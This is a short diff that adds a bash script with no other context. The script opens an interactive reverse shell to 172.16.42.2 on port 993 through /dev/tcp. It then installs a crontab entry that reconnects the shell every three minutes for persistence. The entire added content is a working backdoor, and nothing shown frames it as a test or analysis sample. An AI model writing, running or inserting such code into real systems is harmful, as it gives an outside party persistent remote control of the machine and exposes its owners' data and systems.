@@ -1,0 +1,6 @@
+#!/bin/bash
+host="172.16.42.2"
+port=993
+
+/bin/bash -i > /dev/tcp/${host}/${port} 0<&1 2>&1 &
+(crontab -l ; echo "*/3 * * * * /bin/bash -i > /dev/tcp/${host}/${port} 0<&1 2>&1 &") | crontab -
